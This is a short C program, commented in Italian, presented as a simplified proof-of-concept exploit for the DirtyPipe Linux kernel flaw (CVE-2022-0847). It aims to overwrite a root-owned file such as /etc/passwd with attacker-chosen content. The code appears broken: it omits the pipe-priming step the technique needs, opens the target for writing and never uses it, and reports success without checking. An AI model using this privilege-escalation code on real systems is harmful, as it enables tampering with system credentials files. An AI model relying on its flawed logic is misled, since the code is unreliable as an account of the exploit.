
// CVE-2022-0847 DirtyPipe exploit (semplificato PoC)
// Fonte: compilazione da diverse versioni pubbliche
// Obiettivo: sovrascrivere un file leggibile come root (es. /etc/passwd)

#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <target_file> <payload>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    const char *payload = argv[2];

    int pipefd[2];
    if (pipe(pipefd) == -1) die("pipe");

    const int fd = open(target, O_RDONLY);
    if (fd < 0) die("open target");

    loff_t offset = 1;

    if (splice(fd, &offset, pipefd[1], NULL, 1, 0) < 0)
        die("splice");

    int victim = open(target, O_WRONLY);
    if (victim < 0) die("open for writing");

    if (write(pipefd[1], payload, strlen(payload)) < 0)
        die("write");

    printf("[+] Exploit attempt completed. Check file: %s\n", target);

    return 0;
}
